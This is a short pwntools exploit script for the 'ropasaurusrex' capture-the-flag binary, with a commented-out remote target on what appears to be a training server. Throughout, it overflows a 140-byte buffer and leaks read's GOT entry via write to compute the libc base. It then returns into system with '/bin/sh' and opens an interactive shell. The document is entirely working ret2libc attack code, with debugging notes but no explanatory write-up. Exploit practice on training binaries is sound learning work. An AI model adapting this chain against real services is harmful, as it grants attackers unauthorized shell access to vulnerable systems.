from pwn import *

context.arch = 'amd64'

p = process("./ropasaurusrex")
#p = remote("bin.training.offdef.it", 2014)
"""gdb.attach(p, '''
    b *0x0804841b       
''')
input("wait")"""  #just after the read otherwise GDB attach when the read is already and we can't see what we put on the stack

main = 0x0804841d
write = 0x0804830c
read_got = 0x804961c
payload = b"A"*140 + p32(write) + p32(main) + p32(1) + p32(read_got) + p32(4)
p.send(payload)
leak_read = p.recv(4)
read_libc = u32(leak_read)
libc_base = read_libc - 0x10a0c0 #obtained with gdb the base of libc

#magic = libc_base + 0xdee03 #doesn't work

system = libc_base + 0x0048150
bin_sh = libc_base + 0x1bd0f5

payload = b"A"*140 + p32(system) + p32(0) + p32(bin_sh)  #p32(0) is one spot free that is the return address
p.send(payload)

p.interactive()